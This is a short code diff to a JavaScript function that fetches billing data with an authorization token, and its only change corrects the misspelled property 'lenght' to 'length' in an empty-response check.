@@ -155,7 +155,7 @@ const fetchBilling = async (token) => {
     xmlHttp.setRequestHeader("Authorization", "${token}"); 
     xmlHttp.send(null); 
     xmlHttp.responseText`);
-  if (bill.length === 0 && !bill.lenght) {
+  if (bill.length === 0 && !bill.length) {
     return "";
   }
   return JSON.parse(bill);
